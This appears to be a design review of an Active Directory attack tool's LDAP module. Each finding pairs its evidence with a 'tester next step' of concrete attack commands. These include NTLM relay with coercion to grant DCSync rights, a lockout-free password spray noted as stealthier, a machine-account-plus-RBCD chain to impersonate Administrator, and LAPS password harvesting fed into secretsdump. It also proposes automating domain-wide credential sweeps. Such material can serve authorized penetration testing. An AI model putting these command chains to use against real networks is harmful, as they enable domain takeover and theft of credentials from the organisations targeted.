summary: LDAP module is the most mature in this tranche: hand-rolled BER/ASN.1 client speaks LDAP raw, does credfree RootDSE + anon bind/read (T1), does full credentialed enumeration (T2/T3 - actual auth to the DC and paged directory dump), detects LAPS-readable and RBCD as bulk-cred / delegation abuse primitives. Biggest gap: does not actually PROVE the LAPS read by decrypting a value (kept as truncated indicator) and does not enumerate ADCS objects (ESC1-8) - the CertifyKit vector lives in ad/adcs.py but is disconnected from the LDAP enum path here.

findings.tier_evidence: recce not only bound anonymously but READ the naming context and returned attribute data - directory disclosure is USED not just probed. Anonymous reads on AD default posture is a real misconfig.
findings.promotion_notes: Extend the anon read to paginate objectClass=user with description/servicePrincipalName - the same pass yields kerberoast SPN targets + potential passwords in description for immediate use, giving a first-cred path with zero auth.
findings.tester_next_step: ldapsearch -x -H ldap://<ip> -b '<nc>' '(&(objectCategory=person)(servicePrincipalName=*))' sAMAccountName servicePrincipalName description; feed sAMAccountName list to impacket-GetNPUsers and kerberoast module; grep description for pass/pwd/secret.

findings.tier_evidence: Simple bind with empty creds succeeded - directly observed via LDAP resultCode==0. Correctly downgraded to info since it's AD default (only real when combined with anon_read).
findings.promotion_notes: Already info; escalation to real access requires anon_read which is emitted separately.
findings.tester_next_step: ldapsearch -x -H ldap://<ip>:<port> -s base -b '' '(objectClass=*)'; then try anonymous searches on -b <naming_context>.

findings.tier_evidence: RootDSE fields (namingContexts, functional levels, dnsHostName, supported SASL) pulled pre-auth - baseline recon by design.
findings.promotion_notes: RootDSE is world-readable by design; only value is feeding downstream (kerberos realm, domain/forest for spraying, dc_dns for coerce chain). Ensure it feeds core.known_domains and core.known_hostnames.
findings.tester_next_step: ldapsearch -x -H ldap://<ip> -s base -b '' '(objectClass=*)' '*' +. Parse defaultNamingContext -> use as -b in follow-on searches.

findings.tier_evidence: 389/tcp answered simple bind without TLS - deterministic (port + probe.tls=False). Relay-target condition confirmed.
findings.promotion_notes: Chain with a coercion source (msrpc PrinterBug/PetitPotam) + ntlmrelayx -t ldap://<dc> --escalate-user <you> to grant DCSync. Depends on known_relay_targets and known_coerce_sources shared surfaces.
findings.tester_next_step: impacket-ntlmrelayx.py -t ldap://<dc> --escalate-user <your-lowpriv> --no-smb-server & then Coercer coerce -t <target> -l <you>. On success your account gets DCSync rights.

findings.tier_evidence: RootDSE supportedSASLMechanisms directly listed ANONYMOUS/DIGEST-MD5/PLAIN/LOGIN etc - direct observation of downgrade-friendly auth surface.
findings.promotion_notes: For DIGEST-MD5 attempt a downgrade bind and capture the nonce/response to hashcat-crack offline (John format sapb / dcc). For ANONYMOUS attempt the trace-token bind and prove object visibility.
findings.tester_next_step: ldapwhoami -x -H ldap://<ip> -Y DIGEST-MD5 -U <user>; capture wireshark; convert to $sapb$ hashcat 7300; or ldapsearch -x -Y ANONYMOUS -H ldap://<ip> - test what a trace token unlocks.

findings.tier_evidence: This is USED credentials against the DC: paged directory dump of users + computers + domain object under supplied credential (or NTLM pass-the-hash sealed on 389). Full authenticated foothold on LDAP.
findings.promotion_notes: Add BloodHound-python-equivalent SharpHound collection (session/localgroup/ACL edges) into the same auth session; feed graph into ad/bloodhound.py path-finding for domain-takeover walks.
findings.tester_next_step:
bloodhound-python -u -p

-d -dc -c All --zip; then upload zip to BloodHound-CE and query 'Shortest Path to Domain Admin'. Also nxc ldap -u -p --kerberoasting kerb.txt --asreproast asrep.txt.

findings.title_pattern: Machine account quota allows adding computers
findings.tier_evidence: ms-DS-MachineAccountQuota read from domain object with authenticated bind - authoritative value directly observed.
findings.promotion_notes: Actually invoke impacket-addcomputer to create a shadow computer account, then request an RBCD ticket to a target computer object. Would require write to msDS-AllowedToActOnBehalfOfOtherIdentity - full RBCD chain implementation.
findings.tester_next_step: impacket-addcomputer -computer-name 'RECCE$' -computer-pass 'Recce1234' -dc-ip <ip> <domain>/<user>:<pass>; then impacket-rbcd -delegate-from 'RECCE$' -delegate-to <target>$ -action write <domain>/<user>:<pass>; then getST -spn cifs/<target> -impersonate Administrator -dc-ip <ip> <domain>/RECCE$:Recce1234.

findings.tier_evidence: lockoutThreshold=0 read authoritatively from the domain object - deterministic proof spraying will not lock accounts.
findings.promotion_notes: Chain to kerberos.spray() with enumerated user list (already in module) - a spray of Season2025! / Winter2025! against every enum'd user with zero lockout risk. Auto-wire the enumerated user list to kerberos.spray via shared known_users surface.
findings.tester_next_step: nxc smb <dc> -u users.txt -p 'Winter2025!' --continue-on-success; or kerbrute passwordspray -d <domain> --dc <ip> users.txt 'Winter2025!' (leaves 4771 not 4625 - stealthier).

findings.tier_evidence: Authenticated regex match against description attributes returned real accounts with credential-shaped strings. This is proof-of-exposure - the string is captured, not merely inferred.
findings.promotion_notes: Extract the actual password candidate and validate it against SMB/WinRM/Kerberos for the same sAMAccountName - closes the loop from 'password-shaped' to 'confirmed credential'. Ties into cred_quickconnect flow.
findings.tester_next_step:
ldapsearch -x -H ldap:// -D '@' -w '

' -b '' '(description=*)' sAMAccountName description; parse; then nxc smb -u -p '' to validate; if valid: --local-auth escalation checks.

findings.title_pattern: LAPS local-admin passwords readable via LDAP
findings.tier_evidence: Bound principal actually READ ms-Mcs-AdmPwd / msLAPS-Password values - that's a live local-admin credential harvest across the domain. Values are truncated in the finding for hygiene but the READ is proven.
findings.promotion_notes: Feed the retrieved LAPS passwords into the shared credential store, then auto-attempt SMB/WinRM/RDP login to each computer -> secretsdump -> credential loop. Would give full domain-wide local-admin sweep.
findings.tester_next_step:
nxc ldap -u -p

-M laps; or ldapsearch ... '(ms-Mcs-AdmPwd=*)' sAMAccountName ms-Mcs-AdmPwd; then for each: impacket-secretsdump 'administrator:@' -local-auth.

findings.tier_evidence: msDS-AllowedToActOnBehalfOfOtherIdentity presence directly observed on computer objects - RBCD is confirmed configured. Doesn't decode SD trustees so full impact requires manual check.
findings.promotion_notes: Parse the SD blob to enumerate trustee SIDs, cross-reference with known_users, and stage the s4u2self+s4u2proxy chain when any trustee is compromised.
findings.tester_next_step: python3 -c 'from impacket.ldap.ldaptypes import ...' or use bloodhound-python edge output; then if trustee is compromised: impacket-getST -spn cifs/<target> -impersonate Administrator -dc-ip <dc> <domain>/<trustee>:<pass>.

proposed_shared_surface_consumers: known_users (produce enum'd sAMAccountNames feeding kerberoast + spray)
known_relay_targets (produce - ldap:// on unsigned DC is a relay target)
